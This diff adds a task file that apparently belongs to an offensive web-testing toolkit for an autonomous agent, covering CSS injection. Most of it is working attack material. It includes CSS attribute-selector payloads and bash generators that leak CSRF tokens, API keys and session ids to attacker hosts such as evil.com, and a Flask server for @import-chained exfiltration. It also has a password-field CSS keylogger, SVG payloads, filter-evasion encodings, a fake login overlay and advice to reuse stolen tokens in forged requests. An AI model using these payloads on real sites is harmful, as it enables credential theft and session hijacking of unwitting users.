@@ -1,0 +1,615 @@
+================================================================================
+TASK 59 · CSS INJECTION & DATA EXFILTRATION
+================================================================================
+Covers testing_toolkit.txt Phase 6 Step 20
+Exploit CSS injection when CSP blocks scripts but allows styles.
+
+OBJECTIVE:
+- Find CSS injection points (style attributes, <style> tags, CSS imports)
+- Exfiltrate sensitive data (CSRF tokens, API keys, hidden inputs)
+- Bypass CSP via style-src abuse
+- CSS keylogging and attribute harvesting
+
+================================================================================
+INPUTS
+================================================================================
+outputs/xss_reflections_kxss.txt           ← Reflection points (may allow CSS)
+outputs/queue_xss_manual_exploitation.txt  ← Failed XSS (try CSS instead)
+outputs/queue_dynamic_endpoints_urls.txt   ← Parameterized URLs
+outputs/url_corpus_all_in_scope.txt        ← Full URL corpus
+outputs/waf_fingerprints.txt               ← WAF detection
+
+================================================================================
+OUTPUTS
+================================================================================
+outputs/css_injection/
+├── css_injection_points.txt       ← Confirmed CSS injection locations
+├── css_exfiltrated_data.json      ← Successfully exfiltrated data
+├── css_keylogger_candidates.txt   ← Forms vulnerable to CSS keylogging
+├── csp_style_bypass.txt           ← CSP bypass via style-src
+└── scan_log.txt                   ← Execution log
+
+================================================================================
+🚨 WHEN TO USE CSS INJECTION 🚨
+================================================================================
+CSS injection is your BACKUP when XSS fails due to:
+
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ SCENARIO                           │ WHY CSS WORKS                         │
+├────────────────────────────────────┼───────────────────────────────────────┤
+│ CSP blocks script-src              │ style-src may be 'unsafe-inline'      │
+│ <script> filtered, <style> not     │ Different sanitization rules          │
+│ onclick/onerror blocked            │ CSS doesn't need JS events            │
+│ Template escapes JS, not CSS       │ {user} in style="color:{user}"        │
+│ Input in style attribute           │ Already in CSS context                │
+│ SVG with style injection           │ <svg><style>payload</style></svg>     │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+================================================================================
+PHASE 1: FIND CSS INJECTION POINTS
+================================================================================
+
+───────────────────────────────────────
+1.1 Identify Style Context Reflections
+───────────────────────────────────────
+CSS injection occurs when input reflects in:
+
+CONTEXT 1: Style Attribute
+  <div style="color: USER_INPUT">
+  
+CONTEXT 2: Inside <style> Tag
+  <style>.class { property: USER_INPUT; }</style>
+  
+CONTEXT 3: CSS File via URL
+  @import url("USER_INPUT");
+  background: url(USER_INPUT);
+
+CONTEXT 4: SVG Style Element
+  <svg><style>USER_INPUT</style></svg>
+
+───────────────────────────────────────
+1.2 Detection Methodology
+───────────────────────────────────────
+# Step 1: Send unique marker
+curl -s "https://target.com/page?theme=CSSMARKER123" | grep -i "CSSMARKER123"
+
+# Step 2: Check WHERE it reflects
+# Look for: style=, <style>, url(, @import
+
+# Step 3: Test CSS special characters
+# Try: } { ; : ( ) " ' / * \
+
+# Test payload for style attribute context:
+curl -s "https://target.com/page?color=red;background:url(https://CALLBACK/test)"
+
+# Test payload for style tag context:
+curl -s "https://target.com/page?css=}*{background:url(https://CALLBACK/test)}"
+
+───────────────────────────────────────
+1.3 Automated CSS Injection Detection
+───────────────────────────────────────
+# Check failed XSS reflections - they may allow CSS
+while read url; do
+    # Extract param and test CSS injection
+    echo "[*] Testing: $url"
+    
+    # Test 1: Style attribute breakout
+    test_url=$(echo "$url" | sed 's/=[^&]*/=red;background:url(https:\/\/CALLBACK\/css-test)/')
+    curl -s "$test_url" | grep -q "background:url" && echo "[+] CSS injection: $test_url"
+    
+done < outputs/queue_xss_manual_exploitation.txt
+
+================================================================================
+PHASE 2: ATTRIBUTE SELECTOR EXFILTRATION
+================================================================================
+The core CSS exfiltration technique - leak data character by character.
+
+───────────────────────────────────────
+2.1 How It Works
+───────────────────────────────────────
+CSS attribute selectors can match partial values:
+
+  [attribute^="value"]  → Starts with
+  [attribute$="value"]  → Ends with
+  [attribute*="value"]  → Contains
+  [attribute="value"]   → Exact match
+
+When selector matches, browser fetches the background URL → LEAK!
+
+Example: Stealing CSRF token from <input type="hidden" name="csrf" value="abc123">
+
+  input[name="csrf"][value^="a"] { background: url(https://evil.com/leak?char=a); }
+  input[name="csrf"][value^="b"] { background: url(https://evil.com/leak?char=b); }
+  ...
+
+If token starts with 'a', browser fetches https://evil.com/leak?char=a
+
+───────────────────────────────────────
+2.2 Character-by-Character Exfiltration
+───────────────────────────────────────
+# Generate payload for all printable characters
+CHARS="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_"
+TARGET_ATTR="csrf"  # or "token", "api_key", etc.
+CALLBACK="YOUR_INTERACTSH_DOMAIN"
+
+# First character payload
+for char in $(echo "$CHARS" | sed 's/./& /g'); do
+    echo "input[name=\"$TARGET_ATTR\"][value^=\"$char\"]{background:url(https://$CALLBACK/c1-$char);}"
+done > temp/agent1/css_exfil_char1.css
+
+# Second character (after knowing first = 'a')
+KNOWN="a"
+for char in $(echo "$CHARS" | sed 's/./& /g'); do
+    echo "input[name=\"$TARGET_ATTR\"][value^=\"${KNOWN}$char\"]{background:url(https://$CALLBACK/c2-$char);}"
+done > temp/agent1/css_exfil_char2.css
+
+───────────────────────────────────────
+2.3 Complete Exfiltration Payload Generator
+───────────────────────────────────────
+#!/bin/bash
+# css_exfil_generator.sh
+
+CALLBACK="$1"           # Your callback domain
+TARGET="$2"             # Target attribute name (csrf, token, etc.)
+KNOWN_PREFIX="$3"       # Already known characters (empty for start)
+OUTPUT="$4"             # Output file
+
+CHARSET="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_"
+
+echo "/* CSS Exfiltration Payload - Target: $TARGET, Known: $KNOWN_PREFIX */" > "$OUTPUT"
+
+for char in $(echo "$CHARSET" | fold -w1); do
+    # Input fields
+    echo "input[name=\"$TARGET\"][value^=\"${KNOWN_PREFIX}${char}\"]{background:url(https://${CALLBACK}/${TARGET}-${KNOWN_PREFIX}${char});}" >> "$OUTPUT"
+    
+    # Hidden inputs specifically
+    echo "input[type=\"hidden\"][name=\"$TARGET\"][value^=\"${KNOWN_PREFIX}${char}\"]{background:url(https://${CALLBACK}/hidden-${KNOWN_PREFIX}${char});}" >> "$OUTPUT"
+    
+    # Data attributes
+    echo "[data-$TARGET^=\"${KNOWN_PREFIX}${char}\"]{background:url(https://${CALLBACK}/data-${KNOWN_PREFIX}${char});}" >> "$OUTPUT"
+done
+
+echo "/* Generated $(wc -l < "$OUTPUT") selectors */" >> "$OUTPUT"
+
+# Usage: ./css_exfil_generator.sh evil.interactsh.com csrf "" payload.css
+
+───────────────────────────────────────
+2.4 High-Value Targets to Exfiltrate
+───────────────────────────────────────
+Generate payloads for these common sensitive fields:
+
+# CSRF Tokens
+input[name="csrf"][value^="X"]{background:url(//CALLBACK/csrf-X);}
+input[name="_token"][value^="X"]{background:url(//CALLBACK/token-X);}
+input[name="authenticity_token"][value^="X"]{background:url(//CALLBACK/auth-X);}
+input[name="csrfmiddlewaretoken"][value^="X"]{background:url(//CALLBACK/django-X);}
+input[name="__RequestVerificationToken"][value^="X"]{background:url(//CALLBACK/aspnet-X);}
+
+# API Keys / Secrets (in hidden inputs or data attributes)
+input[name="api_key"][value^="X"]{background:url(//CALLBACK/api-X);}
+input[name="secret"][value^="X"]{background:url(//CALLBACK/secret-X);}
+[data-api-key^="X"]{background:url(//CALLBACK/data-api-X);}
+
+# Session identifiers
+input[name="session"][value^="X"]{background:url(//CALLBACK/session-X);}
+input[name="sid"][value^="X"]{background:url(//CALLBACK/sid-X);}
+
+# User data
+input[name="email"][value^="X"]{background:url(//CALLBACK/email-X);}
+input[name="username"][value^="X"]{background:url(//CALLBACK/user-X);}
+
+================================================================================
+PHASE 3: @IMPORT CHAINING (RECURSIVE EXFIL)
+================================================================================
+Advanced technique: Server generates CSS dynamically based on callback.
+
+───────────────────────────────────────
+3.1 How @import Chaining Works
+───────────────────────────────────────
+1. Inject: @import url(https://evil.com/start.css);
+2. Evil server responds with CSS containing selectors for char 1
+3. Browser callback reveals char 1 (e.g., 'a')
+4. Evil server responds with next CSS: selectors for char 2 (a+?)
+5. Repeat until full value extracted
+
+This is FASTER than manual iteration - server automates the loop.
+
+───────────────────────────────────────
+3.2 @import Injection Points
+───────────────────────────────────────
+# If you control CSS import
+<style>@import url(USER_INPUT);</style>
+<link rel="stylesheet" href="USER_INPUT">
+style="@import url('USER_INPUT');"
+
+# Payload
+@import url(https://evil.com/exfil-server?target=csrf);
+
+───────────────────────────────────────
+3.3 Server-Side Exfil Script (Python)
+───────────────────────────────────────
+# css_exfil_server.py (run on your VPS)
+from flask import Flask, request, Response
+import string
+
+app = Flask(__name__)
+
+# Track extracted values per session
+extracted = {}
+
+@app.route('/exfil')
+def exfil():
+    target = request.args.get('target', 'csrf')
+    known = request.args.get('known', '')
+    
+    # Generate next round of selectors
+    charset = string.ascii_letters + string.digits + '-_'
+    css = ""
+    
+    for char in charset:
+        test_val = known + char
+        css += f'input[name="{target}"][value^="{test_val}"]'
+        css += f'{{background:url(https://YOUR_DOMAIN/callback?target={target}&found={test_val});}}\n'
+    
+    # Add @import for next iteration
+    css += f'@import url(https://YOUR_DOMAIN/exfil?target={target}&known={known});'
+    
+    return Response(css, mimetype='text/css')
+
+@app.route('/callback')
+def callback():
+    target = request.args.get('target')
+    found = request.args.get('found')
+    print(f"[+] LEAKED: {target} = {found}")
+    
+    # Store progress
+    extracted[target] = found
+    return '', 204
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=8080, ssl_context='adhoc')
+
+================================================================================
+PHASE 4: CSS KEYLOGGING
+================================================================================
+Capture keystrokes as user types in form fields.
+
+───────────────────────────────────────
+4.1 How CSS Keylogging Works
+───────────────────────────────────────
+Using `[value$="X"]` selector (ends with) to detect each keystroke:
+
+input[type="password"][value$="a"]{background:url(//evil/key-a);}
+input[type="password"][value$="b"]{background:url(//evil/key-b);}
+...
+
+As user types, each character triggers a callback in sequence.
+
+───────────────────────────────────────
+4.2 Keylogger Payload Generator
+───────────────────────────────────────
+#!/bin/bash
+# css_keylogger.sh
+
+CALLBACK="$1"
+CHARSET="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{}|;:,.<>?"
+
+# Password field keylogger
+for char in $(echo "$CHARSET" | fold -w1); do
+    # URL encode special chars
+    encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$char'))")
+    echo "input[type=\"password\"][value\$=\"$char\"]{background:url(https://$CALLBACK/key-$encoded);}"
+done
+
+# Generic input keylogger
+for char in $(echo "$CHARSET" | fold -w1); do
+    encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$char'))")
+    echo "input[value\$=\"$char\"]{background:url(https://$CALLBACK/input-$encoded);}"
+done
+
+───────────────────────────────────────
+4.3 Limitations of CSS Keylogging
+───────────────────────────────────────
+⚠️ Only works when:
+- Input has `value` attribute reflecting current value
+- Works with: React controlled inputs, Angular ngModel
+- Does NOT work with: native inputs without value binding
+
+Test if target is vulnerable:
+# Type in field, check if value= attribute updates in DOM
+# Use browser DevTools to observe
+
+================================================================================
+PHASE 5: @FONT-FACE UNICODE-RANGE EXFIL
+================================================================================
+Use custom fonts to detect specific characters.
+
+───────────────────────────────────────
+5.1 How It Works
+───────────────────────────────────────
+@font-face {
+    font-family: exfil;
+    src: url(https://evil.com/leak?char=a);
+    unicode-range: U+0061; /* 'a' */
+}
+
+.target-element {
+    font-family: exfil;
+}
+
+If target element contains 'a', browser fetches the font URL.
+
+───────────────────────────────────────
+5.2 Font-Based Exfiltration Payload
+───────────────────────────────────────
+/* Generate @font-face for each character */
+@font-face { font-family: e0; src: url(//evil/f-0); unicode-range: U+0030; } /* 0 */
+@font-face { font-family: e1; src: url(//evil/f-1); unicode-range: U+0031; } /* 1 */
+@font-face { font-family: e2; src: url(//evil/f-2); unicode-range: U+0032; } /* 2 */
+/* ... continue for all characters ... */
+@font-face { font-family: ea; src: url(//evil/f-a); unicode-range: U+0061; } /* a */
+@font-face { font-family: eb; src: url(//evil/f-b); unicode-range: U+0062; } /* b */
+/* ... */
+
+.secret-data {
+    font-family: e0,e1,e2,e3,e4,e5,e6,e7,e8,e9,ea,eb,ec,ed,ee,ef;
+}
+
+⚠️ Reveals WHICH characters exist, not their ORDER or COUNT.
+   Best for confirming character presence, not full extraction.
+
+================================================================================
+PHASE 6: CSP STYLE-SRC BYPASS
+================================================================================
+
+───────────────────────────────────────
+6.1 Check CSP for Style-src
+───────────────────────────────────────
+# Get CSP header
+curl -sI "https://target.com/" | grep -i "content-security-policy"
+
+Look for:
+- style-src 'unsafe-inline'  → CSS injection possible!
+- style-src 'self'           → Need to inject via same-origin CSS file
+- style-src *                → Any external CSS allowed
+- No style-src               → Falls back to default-src
+
+───────────────────────────────────────
+6.2 CSP Bypass Scenarios
+───────────────────────────────────────
+SCENARIO 1: script-src strict, style-src 'unsafe-inline'
+→ XSS blocked but CSS injection works!
+→ Use CSS exfiltration techniques above
+
+SCENARIO 2: style-src 'self' only
+→ Find CSS file upload or injection in same-origin CSS
+→ Look for theme/customization features
+
+SCENARIO 3: style-src with CDN whitelist
+→ Check if CDN allows user-uploaded content
+→ CDN JSONP endpoints may help
+
+───────────────────────────────────────
+6.3 CSS-Only XSS Alternatives
+───────────────────────────────────────
+When scripts blocked, CSS can still:
+
+1. EXFILTRATE DATA (as shown above)
+
+2. PHISHING/UI REDRESS
+   .real-form { display: none; }
+   body::before {
+       content: "Session expired. Re-enter password:";
+       /* Fake login overlay */
+   }
+
+3. CONTENT INJECTION (limited)
+   /* Show attacker content */
+   .page::before { content: "HACKED"; }
+   
+4. REDIRECT via meta refresh (if HTML injection possible)
+   </style><meta http-equiv="refresh" content="0;url=https://evil.com">
+
+================================================================================
+PHASE 7: SVG + CSS INJECTION
+================================================================================
+
+───────────────────────────────────────
+7.1 SVG Style Injection
+───────────────────────────────────────
+SVG files can contain <style> elements:
+
+<svg xmlns="http://www.w3.org/2000/svg">
+    <style>
+        input[value^="a"]{background:url(https://evil.com/a);}
+    </style>
+</svg>
+
+If SVG is embedded or served as image → CSS executes!
+
+───────────────────────────────────────
+7.2 SVG Injection Payloads
+───────────────────────────────────────
+# If you can inject into SVG context
+</text><style>@import url(https://evil.com/exfil.css);</style><text>
+
+# Full SVG file for upload
+<?xml version="1.0"?>
+<svg xmlns="http://www.w3.org/2000/svg">
+<style>
+/* CSS exfiltration payloads here */
+@import url(https://evil.com/exfil?target=csrf);
+</style>
+</svg>
+
+================================================================================
+PHASE 8: PRACTICAL ATTACK WORKFLOW
+================================================================================
+
+───────────────────────────────────────
+8.1 Step-by-Step CSS Exfiltration Attack
+───────────────────────────────────────
+1. START OOB LISTENER
+   interactsh-client -v
+   # Note your domain: xyz123.interactsh.com
+
+2. FIND INJECTION POINT
+   # Test reflection in style context
+   curl "https://target.com/page?theme=red;}" | grep "red;}"
+
+3. IDENTIFY TARGET DATA
+   # View page source, find hidden inputs
+   curl -s "https://target.com/form" | grep -i "hidden\|csrf\|token"
+   
+   Example: <input type="hidden" name="csrf" value="abc123def456">
+
+4. GENERATE PAYLOAD
+   # For first character of csrf token
+   ./css_exfil_generator.sh xyz123.interactsh.com csrf "" payload.css
+
+5. INJECT PAYLOAD
+   # URL encode the CSS payload
+   PAYLOAD=$(cat payload.css | python3 -c "import sys,urllib.parse;print(urllib.parse.quote(sys.stdin.read()))")
+   
+   # Inject via vulnerable parameter
+   curl "https://target.com/page?theme=red}${PAYLOAD}"
+
+6. MONITOR CALLBACKS
+   # Watch interactsh for callbacks
+   # You'll see: /csrf-a or /csrf-b etc.
+
+7. ITERATE
+   # First char = 'a' → generate payload for 'a?'
+   ./css_exfil_generator.sh xyz123.interactsh.com csrf "a" payload2.css
+   # Repeat until full token extracted
+
+───────────────────────────────────────
+8.2 Full Automated Exfiltration Script
+───────────────────────────────────────
+#!/bin/bash
+# css_full_exfil.sh
+
+TARGET_URL="$1"           # Vulnerable URL with CSS injection
+PARAM="$2"                # Vulnerable parameter
+TARGET_FIELD="$3"         # Field to exfiltrate (csrf, token, etc.)
+CALLBACK="$4"             # Your callback domain
+
+CHARSET="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+EXTRACTED=""
+MAX_LEN=32
+
+echo "[*] Starting CSS exfiltration"
+echo "[*] Target: $TARGET_URL"
+echo "[*] Field: $TARGET_FIELD"
+
+for i in $(seq 1 $MAX_LEN); do
+    echo "[*] Extracting character $i..."
+    
+    # Generate payload for current position
+    PAYLOAD=""
+    for char in $(echo "$CHARSET" | fold -w1); do
+        PAYLOAD+="input[name=\"${TARGET_FIELD}\"][value^=\"${EXTRACTED}${char}\"]{background:url(https://${CALLBACK}/pos${i}-${char});}"
+    done
+    
+    # URL encode
+    ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$PAYLOAD'''))")
+    
+    # Send request (user needs to trigger in browser)
+    echo "[!] Inject this payload and trigger in victim browser:"
+    echo "${TARGET_URL}?${PARAM}=}${ENCODED}"
+    
+    # Wait for callback (manual step - check interactsh)
+    read -p "[?] Enter extracted character (or 'done'): " FOUND
+    
+    if [ "$FOUND" == "done" ]; then
+        break
+    fi
+    
+    EXTRACTED+="$FOUND"
+    echo "[+] Current value: $EXTRACTED"
+done
+
+echo "[+] FINAL EXTRACTED VALUE: $EXTRACTED"
+
+================================================================================
+🧠 YOU ARE AN INTELLIGENT AGENT 🧠
+================================================================================
+CSS injection requires PRECISE understanding. Do NOT blindly inject.
+
+OBSERVE FIRST:
+─────────────
+- Does CSP block scripts? Check Content-Security-Policy header
+- WHERE does input reflect? (style attribute vs <style> tag vs CSS file)
+- WHAT encoding is applied? (HTML entities, CSS escaping)
+- What SENSITIVE DATA exists on page? (hidden inputs, data attributes)
+
+UNDERSTAND THE CONTEXT:
+───────────────────────
+CSS INJECTION CONTEXT DETERMINES PAYLOAD:
+
+┌────────────────────────────────────────────────────────────────────────────┐
+│ Context                  │ You Need To                 │ Example Payload   │
+├──────────────────────────┼─────────────────────────────┼───────────────────┤
+│ style="color: INPUT"     │ Add ; then new property     │ red;background:   │
+│ style="color: 'INPUT'"   │ Break quote first           │ ';background:     │
+│ <style>.x{color:INPUT}   │ Close brace, add selector   │ }*{background:    │
+│ @import url("INPUT")     │ Close quote/paren           │ ");@import url(   │
+│ background: url(INPUT)   │ Close paren, add property   │ );background:url( │
+└────────────────────────────────────────────────────────────────────────────┘
+
+THINK ABOUT EXFIL TARGETS:
+──────────────────────────
+Before generating payloads, IDENTIFY what's worth stealing:
+1. View page source
+2. Look for: hidden inputs, data-* attributes, form fields
+3. Prioritize: CSRF tokens > API keys > session data > user info
+
+ADAPT TO FILTERS:
+─────────────────
+If basic payload blocked, try:
+- CSS comments: }/**/input[value^="a"]{/**/background:url()
+- Case variations: INPUT, Input, iNpUt
+- Encoding: \75rl() = url(), \62ackground = background
+- Whitespace tricks: input[value^="a"]{background:url()}
+
+VERIFY EXTRACTION:
+──────────────────
+After extracting token, VERIFY it works:
+1. Use extracted CSRF token in forged request
+2. If it works → confirmed vulnerability
+3. Document full extraction chain for report
+
+PATIENCE IS KEY:
+────────────────
+- Character-by-character exfil is SLOW
+- Full 32-char token = 32 injection rounds
+- Use @import chaining for faster automated extraction
+- Consider if partial extraction is enough for PoC
+
+================================================================================
+COMMON MISTAKES TO AVOID
+================================================================================
+❌ Injecting without checking if CSS context exists
+❌ Forgetting to URL-encode payloads
+❌ Not starting OOB listener first
+❌ Trying CSS exfil when input doesn't reflect in style context
+❌ Using [value^=] on elements without value attribute
+❌ Not checking CSP - if style-src blocks external, @import won't work
+
+================================================================================
+SUCCESS CRITERIA
+================================================================================
+✓ CSS injection points identified and documented
+✓ Sensitive data targets mapped (CSRF tokens, hidden inputs)
+✓ Character-by-character exfiltration demonstrated
+✓ Full token/secret extracted (or enough for PoC)
+✓ CSP bypass documented if applicable
+✓ CSS keylogging tested on login forms
+
+================================================================================
+NEXT STEPS
+================================================================================
+→ Task 60: Dangling Markup Injection (Step 21)
+→ Use extracted CSRF tokens to chain with other vulnerabilities
+→ If CSS blocked, try dangling markup for token theft
+
